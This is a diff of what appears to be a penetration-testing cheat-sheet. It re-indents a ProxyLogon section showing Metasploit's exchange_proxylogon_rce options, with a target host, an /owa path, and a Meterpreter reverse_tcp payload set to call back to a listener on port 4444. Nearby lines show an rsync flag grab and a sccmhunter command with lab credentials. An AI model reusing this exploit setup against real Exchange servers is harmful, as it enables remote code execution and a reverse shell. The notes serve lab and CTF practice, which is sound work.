@@ -1670,42 +1670,43 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	sccmhunter.py find -u adm -p 'Apolo' -d kaban.zazprom.ru -dc-ip 10.*.*.*-debug
 
 # Proxylogon
+	
 	exploit(windows/http/exchange_proxylogon_rce)
-msf exploit(windows/http/exchange_proxylogon_rce)
+	msf exploit(windows/http/exchange_proxylogon_rce)
 
-Name              Current Setting                   Required  Description
-   ----              ---------------                   --------  -----------
-   EMAIL             admin@mail.ru						yes       A known email address for this organization
-   METHOD            POST                              yes       HTTP Method to use for the check (Accepted: GET, POST)
-   Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
-   RHOSTS            10.10.6.20                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT             443                               yes       The target port (TCP)
-   SSL               true                              no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                                             no        Path to a custom SSL certificate (default is randomly generated)
-   URIPATH           /owa                              no        The URI to use for this exploit (default is random)
-   UseAlternatePath  false                             yes       Use the IIS root dir as alternate path
-   VHOST                                               no        HTTP server virtual host
-
-
-   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT  8080             yes       The local port to listen on.
+	Name              Current Setting                   Required  Description
+   	----              ---------------                   --------  -----------
+   	EMAIL             admin@mail.ru						yes       A known email address for this organization
+   	METHOD            POST                              yes       HTTP Method to use for the check (Accepted: GET, POST)
+   	Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
+   	RHOSTS            10.10.6.20                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   	RPORT             443                               yes       The target port (TCP)
+   	SSL               true                              no        Negotiate SSL/TLS for outgoing connections
+   	SSLCert                                             no        Path to a custom SSL certificate (default is randomly generated)
+   	URIPATH           /owa                              no        The URI to use for this exploit (default is random)
+   	UseAlternatePath  false                             yes       Use the IIS root dir as alternate path
+   	VHOST                                               no        HTTP server virtual host
 
 
-Payload options (windows/x64/meterpreter/reverse_tcp):
+   	When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
 
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.12.116.43 	  yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
+   	Name     Current Setting  Required  Description
+   	----     ---------------  --------  -----------
+   	SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   	SRVPORT  8080             yes       The local port to listen on.
 
 
-Exploit target:
+	Payload options (windows/x64/meterpreter/reverse_tcp):
 
-   Id  Name
-   --  ----
-   0   Windows Powershell
+   	Name      Current Setting  Required  Description
+   	----      ---------------  --------  -----------
+   	EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   	LHOST     10.12.116.43 	  yes       The listen address (an interface may be specified)
+   	LPORT     4444             yes       The listen port
+
+
+	Exploit target:
+
+	   Id  Name
+   	--  ----
+   	0   Windows Powershell
